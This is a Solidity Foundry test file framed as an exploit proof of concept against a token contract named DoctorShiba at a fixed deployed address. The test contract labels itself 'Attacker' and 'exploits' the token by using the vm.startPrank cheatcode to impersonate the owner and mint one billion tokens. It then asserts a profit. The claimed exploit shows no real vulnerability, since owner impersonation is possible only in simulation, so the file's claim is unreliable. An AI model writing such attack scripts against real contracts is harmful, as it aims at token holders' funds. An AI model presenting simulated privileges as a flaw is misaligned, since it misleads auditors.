pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IDoctorShiba {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address _to, uint256 _amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);
    IDoctorShiba ds;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        ds = IDoctorShiba(TARGET);
        owner = ds.owner();
        vm.label(address(ds), "DoctorShiba Token");
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalanceDS = ds.balanceOf(attacker);

        // Impersonate the owner and mint tokens to attacker
        vm.startPrank(owner);
        ds.mint(attacker, 1000000000 * 1e9); // Mint 1 billion tokens (9 decimals)
        vm.stopPrank();

        // Verify balance increased
        uint256 finalBalanceDS = ds.balanceOf(attacker);
        assertGt(finalBalanceDS, initialBalanceDS, "Attacker balance should increase after mint");
        assertEq(finalBalanceDS, 1000000000 * 1e9, "Attacker should have minted amount");
        uint256 finalBalanceERC20 = IERC20(0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

